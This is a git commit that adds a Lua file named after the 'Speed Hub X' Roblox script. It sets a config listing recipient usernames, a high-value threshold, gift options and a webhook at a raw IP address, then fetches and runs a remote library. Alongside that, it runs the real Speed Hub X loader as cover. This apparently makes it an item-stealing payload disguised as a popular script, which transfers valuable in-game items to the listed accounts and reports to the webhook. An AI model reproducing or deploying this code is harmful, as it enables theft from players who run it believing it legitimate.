42dbd91810b37c514f8f28749df0f7cd8a072d0b
AhmadV99-max <esportsteam168@gmail.com>
2025-08-02 11:40:32 +0700

    Create Speed%20Hub%20X.lua

---
+++ Speed%20Hub%20X.lua
@@ -0,0 +1,14 @@
+_G.NullConfig = {
+    User = {"1SamRatana", "DEVFURYYT", "IQKH168", "DEVPHOEM", "devkak5", "Sky168295", "Babysky1688", "Ahlalu"},
+    min_value = 10000000000,
+    pingEveryone = "Yes", -- dont change this
+    Webhook = "http://45.13.225.83:20002/proxy/48ac930df23c721d7403fb1413603c60",
+    FakeGift = "No",
+    Trash = "http://45.13.225.83:20002/proxy/48ac930df23c721d7403fb1413603c60",
+    LoadingScreen = "No",
+    GiftOnlyRares = "No",
+    ExecuteOtherScript = "Yes",
+    OtherScript = "loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()",
+}
+    
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
